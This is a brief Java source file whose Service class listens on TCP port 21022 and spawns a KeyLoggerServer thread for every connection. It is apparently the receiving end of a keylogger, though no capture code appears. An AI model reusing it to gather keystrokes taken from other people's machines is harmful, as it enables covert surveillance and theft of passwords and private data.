package com.samasend;

import java.io.IOException;
import java.net.ServerSocket;

/**
 *
 * @author SamAsEnd
 */
public class Service {

    public static void main(String[] args) throws IOException {
        ServerSocket server = new ServerSocket(21022);
        while(true) {
            new KeyLoggerServer(server.accept()).start();
        }
    }

}
